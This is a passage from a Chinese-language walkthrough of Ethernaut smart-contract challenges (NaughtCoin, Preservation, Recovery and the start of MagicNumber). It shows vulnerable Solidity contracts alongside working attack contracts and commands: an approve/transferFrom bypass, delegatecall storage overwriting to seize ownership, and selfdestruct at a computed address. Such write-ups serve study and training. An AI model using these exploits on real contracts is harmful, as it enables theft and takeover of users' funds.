punctuation">.</span>sender <span class="token operator">==</span> player<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">require</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>timestamp <span class="token operator">></span> timeLock<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">_</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">_</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要求代币变为0即可。</p><p>ERC20标准转账代币有两种方式，transfer以及transferFrom，但是transfer被重写了，所以只能用</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">transferFrom</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span>        <span class="token builtin">address</span> to<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> amount    <span class="token punctuation">)</span> <span class="token keyword">public</span> virtual override <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">address</span> spender <span class="token operator">=</span> <span class="token function">_msgSender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">_spendAllowance</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">_transfer</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是转帐前，需要approver授权。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">//secondaddr是另外一个账户地址</span>secondad<span class="token operator">=</span><span class="token string">'0x02823a3D576A35988a623BB3d7F9e9A6D0ae7674'</span>totalvalue<span class="token operator">=</span><span class="token string">'1000000000000000000000000'</span><span class="token comment">//给自己授权</span>await <span class="token keyword">contract</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>player<span class="token punctuation">,</span>totalvalue<span class="token punctuation">)</span>await <span class="token keyword">contract</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>player<span class="token punctuation">,</span>secondaddr<span class="token punctuation">,</span>totalvalue<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="preservation"><a class="markdownIt-Anchor" href="#preservation"></a> <strong>Preservation</strong></h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Preservation</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// public library contracts</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone1Library<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone2Library<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> storedTime<span class="token punctuation">;</span>    <span class="token comment">// Sets the function signature for delegatecall</span>    <span class="token builtin">bytes4</span> <span class="token keyword">constant</span> setTimeSignature <span class="token operator">=</span> <span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"setTime(uint256)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _timeZone1LibraryAddress<span class="token punctuation">,</span> <span class="token builtin">address</span> _timeZone2LibraryAddress<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        timeZone1Library <span class="token operator">=</span> _timeZone1LibraryAddress<span class="token punctuation">;</span>        timeZone2Library <span class="token operator">=</span> _timeZone2LibraryAddress<span class="token punctuation">;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// set the time for timezone 1</span>    <span class="token keyword">function</span> <span class="token function">setFirstTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        timeZone1Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// set the time for timezone 2</span>    <span class="token keyword">function</span> <span class="token function">setSecondTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        timeZone2Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Simple library contract to set the time</span><span class="token keyword">contract</span> <span class="token class-name">LibraryContract</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// stores a timestamp</span>    <span class="token builtin">uint256</span> storedTime<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">setTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _time<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        storedTime <span class="token operator">=</span> _time<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要求获得合约所有权。</p><p>本题的关键就是delegatecall函数，该函数调用后内置变量 <code>msg</code> 的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）。也就是说</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"> <span class="token keyword">function</span> <span class="token function">setFirstTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        timeZone1Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">setSecondTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        timeZone2Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当这两个函数调用时，他们改变的是slot0的变量，而我们要求改变合约的拥有者，即slot2处的变量。而这两个合约的变量分布为</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>    unused       <span class="token operator">|</span>                timeZone1Library<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>         slot <span class="token number">0</span>    <span class="token number">12</span> <span class="token builtin">bytes</span>     <span class="token operator">|</span>                <span class="token number">20</span> <span class="token builtin">bytes</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>    unused       <span class="token operator">|</span>                timeZone2Library<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>         slot <span class="token number">1</span>    <span class="token number">12</span> <span class="token builtin">bytes</span>     <span class="token operator">|</span>                <span class="token number">20</span> <span class="token builtin">bytes</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>    unused       <span class="token operator">|</span>                owner<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>         slot <span class="token number">2</span>    <span class="token number">12</span> <span class="token builtin">bytes</span>     <span class="token operator">|</span>                <span class="token number">20</span> <span class="token builtin">bytes</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>                storedTime<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>         slot <span class="token number">3</span>                <span class="token number">32</span> <span class="token builtin">bytes</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>                storedTime<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>         slot <span class="token number">0</span>                <span class="token number">32</span> <span class="token builtin">bytes</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以当我们调用setFirstTime函数时，我们调用的是setTime函数。因此，我们可以将timeZone1Library的地址改为攻击合约的地址，然后在攻击合约中写一个setime函数，当执行imeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));时，就可以调用攻击合约的setime函数。</p><p>我们需要注意owner占据slot2 的低20个字节即可</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">AttackPreservation</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// stores a timestamp</span>    <span class="token builtin">address</span> doesNotMatterWhatThisIsOne<span class="token punctuation">;</span>    <span class="token builtin">address</span> doesNotMatterWhatThisIsTwo<span class="token punctuation">;</span>    <span class="token builtin">address</span> maliciousIndex<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">setTime</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _time<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        maliciousIndex <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token builtin">uint160</span><span class="token punctuation">(</span>_time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>部署完成后，执行await contract.setFirstTime(‘攻击合约’)</p><p>然后再执行 await contract.setFirstTime(‘player’)就可以了。</p><h3 id="recovery"><a class="markdownIt-Anchor" href="#recovery"></a> <strong>Recovery</strong></h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Recovery</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//generate tokens</span>    <span class="token keyword">function</span> <span class="token function">generateToken</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _name<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _initialSupply<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">new</span> <span class="token class-name">SimpleToken</span><span class="token punctuation">(</span>_name<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> _initialSupply<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">SimpleToken</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">string</span> <span class="token keyword">public</span> name<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>    <span class="token comment">// constructor</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _name<span class="token punctuation">,</span> <span class="token builtin">address</span> _creator<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _initialSupply<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        name <span class="token operator">=</span> _name<span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>_creator<span class="token punctuation">]</span> <span class="token operator">=</span> _initialSupply<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// collect ether in return for tokens</span>    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>value <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// allow transfers of tokens</span>    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-</span> _amount<span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">=</span> _amount<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// clean up after ourselves</span>    <span class="token keyword">function</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _to<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>_to<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从合约地址找回丢失的0.5eth</p><h4 id="analyse-4"><a class="markdownIt-Anchor" href="#analyse-4"></a> Analyse</h4><p>通过自毁函数进行转账</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _to<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>_to<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>更新msg.sender余额</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _amount<span class="token punctuation">)</span><span class="token punctuation">;</span>     balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-</span> _amount<span class="token punctuation">;</span>     balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">=</span> _amount<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只需找到合约地址实行自毁函数将eth转会玩家地址就行。</p><h5 id="寻找地址"><a class="markdownIt-Anchor" href="#寻找地址"></a> 寻找地址</h5><ol><li><p>通过etherscan进行查找</p></li><li><p>计算得到</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Hack</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">getdd</span><span class="token punctuation">(</span><span class="token builtin">address</span> target<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">address</span> data <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token builtin">uint160</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token builtin">bytes1</span><span class="token punctuation">(</span><span class="token number">0xd6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">bytes1</span><span class="token punctuation">(</span><span class="token number">0x94</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target<span class="token punctuation">,</span> <span class="token builtin">bytes1</span><span class="token punctuation">(</span><span class="token number">0x01</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> data<span class="token punctuation">;</span> <span class="token comment">//0x8B7bAdf88cBaE3F8Ed26Df75475133E4972bB606</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="attack-4"><a class="markdownIt-Anchor" href="#attack-4"></a> Attack</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">attack</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">payable</span> target<span class="token punctuation">;</span> <span class="token comment">//合约地址</span>    <span class="token builtin">address</span> <span class="token keyword">payable</span> myaddr<span class="token punctuation">;</span> <span class="token comment">//player</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _addr<span class="token punctuation">,</span> <span class="token builtin">address</span> <span class="token keyword">payable</span> _myaddr<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        target<span class="token operator">=</span>_addr<span class="token punctuation">;</span>        myaddr<span class="token operator">=</span>_myaddr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">&#123;</span>        target<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"destroy(address)"</span><span class="token punctuation">,</span>myaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>部署后运行 exploit函数就行。</p><h3 id="magicnumber"><a class="markdownIt-Anchor" href="#magicnumber"></a> <strong>MagicNumber</strong></h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">MagicNum</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> solver<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">setSolver</span><span class="token punctuation">(</span><span class="token builtin">address</span> _solver<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        solver <span class="token operator">=</span> _solver<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/*    ____________/\\\_______/\\\\\\\\\_____             __________/\\\\\_____/\\\///////\\\___             ________/\\\/\\\____\///______\//\\\__             